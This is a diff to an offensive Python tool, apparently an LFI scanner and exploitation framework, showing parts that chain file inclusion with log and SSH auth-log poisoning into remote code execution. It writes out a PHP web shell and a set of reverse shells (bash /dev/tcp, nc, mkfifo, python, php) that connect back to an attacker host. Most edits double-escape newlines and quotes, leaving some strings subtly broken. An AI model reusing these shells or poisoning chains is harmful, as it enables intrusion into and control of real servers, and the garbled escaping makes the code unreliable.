@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 """
-lfiller.py v3.6 Ultimate Industrial Edition
-THE LFI AUDITOR: Industrial Grade Local File Inclusion Scanner.
-Based on v3.0 Industrial.
-ADDED: Session Support (-C) & Custom Headers (-H) for Authenticated Audits.
+lfiller.py v3.6
+THE LFI AUDITOR: Industrial Grade Local File Inclusion Scanner..
+ADDED: 
+- Smart Payload Reuse (Auto-learns traversal depth)
+- RCE Safety Gating (--rce) & Advanced Shells (UDP/FD)
+- Authenticated Audits (-C Cookies, -H Headers)
+- Port Knocking & Knockd Detection
 """
 
 import requests
@@ -242,7 +245,7 @@ class LFILLER:
     def scan_parameter(self, param):
         """Threaded scan for a single parameter"""
         # Simple heartbeat to show activity
-        sys.stdout.write(f" [.] Scanning: {param}\r")
+        sys.stdout.write(f" [.] Scanning: {param}\\r")
         sys.stdout.flush()
         found_on_param = False
         for base_payload in self.lfi_payloads_base:
@@ -454,7 +457,7 @@ class LFILLER:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
             sock.connect((target_ip, 22))
-            sock.sendall(f'{php_code}\r\n'.encode())
+            sock.sendall(f'{php_code}\\r\\n'.encode())
             sock.close()
             time.sleep(3)
             
@@ -473,7 +476,7 @@ class LFILLER:
 
     def create_webshell(self, param):
         if not self.webshell_mode: return
-        print(f"\n[*] Attempting web shell creation...")
+        print(f"\\n[*] Attempting web shell creation...")
         
         random_filename = self._generate_random_name()
         shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
@@ -499,11 +502,11 @@ class LFILLER:
                         if 'system(' not in r.text and r.status_code == 200:
                             with self.lock:
                                 self.results['webshell_urls'].append(check_url)
-                                story = f"CHAIN: LFI -> Log Poisoning -> RCE\n"
-                                story += f"1. Identified LFI on parameter '{param}'\n"
-                                story += f"2. Confirmed readable log at '{p['log']}'\n"
-                                story += f"3. Poisoned '{p['log']}' by sending PHP code in User-Agent header\n"
-                                story += f"4. Included poisoned log via LFI with command 'echo payload > {loc}'\n"
+                                story = f"CHAIN: LFI -> Log Poisoning -> RCE\\n"
+                                story += f"1. Identified LFI on parameter '{param}'\\n"
+                                story += f"2. Confirmed readable log at '{p['log']}'\\n"
+                                story += f"3. Poisoned '{p['log']}' by sending PHP code in User-Agent header\\n"
+                                story += f"4. Included poisoned log via LFI with command 'echo payload > {loc}'\\n"
                                 story += f"5. Verified shell at {check_url}"
                                 self.results['exploitation_stories'].append(story)
                                 print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
@@ -527,11 +530,11 @@ class LFILLER:
                     if r.status_code == 200:
                         with self.lock:
                             self.results['webshell_urls'].append(check_url)
-                            story = f"CHAIN: LFI -> SSH Poisoning -> RCE\n"
-                            story += f"1. Identified LFI on parameter '{param}'\n"
-                            story += f"2. Confirmed readable auth log at '/var/log/auth.log'\n"
-                            story += f"3. Targeted target IP for SSH connection, sending PHP code as username\n"
-                            story += f"4. Included auth log via LFI with command to write persistent shell to '{loc}'\n"
+                            story = f"CHAIN: LFI -> SSH Poisoning -> RCE\\n"
+                            story += f"1. Identified LFI on parameter '{param}'\\n"
+                            story += f"2. Confirmed readable auth log at '/var/log/auth.log'\\n"
+                            story += f"3. Targeted target IP for SSH connection, sending PHP code as username\\n"
+                            story += f"4. Included auth log via LFI with command to write persistent shell to '{loc}'\\n"
                             story += f"5. Verified shell at {check_url}"
                             self.results['exploitation_stories'].append(story)
                             print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
@@ -544,7 +547,7 @@ class LFILLER:
 
     def execute_shells(self, param):
         if not self.lhost or not param: return
-        print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
+        print(f"\\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
         
         reverse_shells = {
             'bash_tcp': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
@@ -552,10 +555,10 @@ class LFILLER:
             'sh_fd_5': f'exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do $line 2>&5 >&5; done',
             'sh_fd_direct': f'sh -i 5<> /dev/tcp/{self.lhost}/{self.lport} 0<&5 1>&5 2>&5',
             'bash_udp': f'sh -i >& /dev/udp/{self.lhost}/{self.lport} 0>&1',
-            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
+            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\'/bin/sh\\')"',
             'nc_e': f'nc -e /bin/sh {self.lhost} {self.lport}',
             'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f',
-            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
+            'php': f'php -r \\'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\\''
         }
         
         sent_count = 0
@@ -1013,13 +1016,6 @@ class LFILLER:
         print("="*70)
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='LFILLER v3.6 - Industrial LFI Framework',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-[... Quick Examples omitted for brevity but functionality preserved ...]
-        """
-    )
     parser = argparse.ArgumentParser(
         description='LFILLER v3.6 - Industrial LFI Framework',
         formatter_class=argparse.RawDescriptionHelpFormatter,
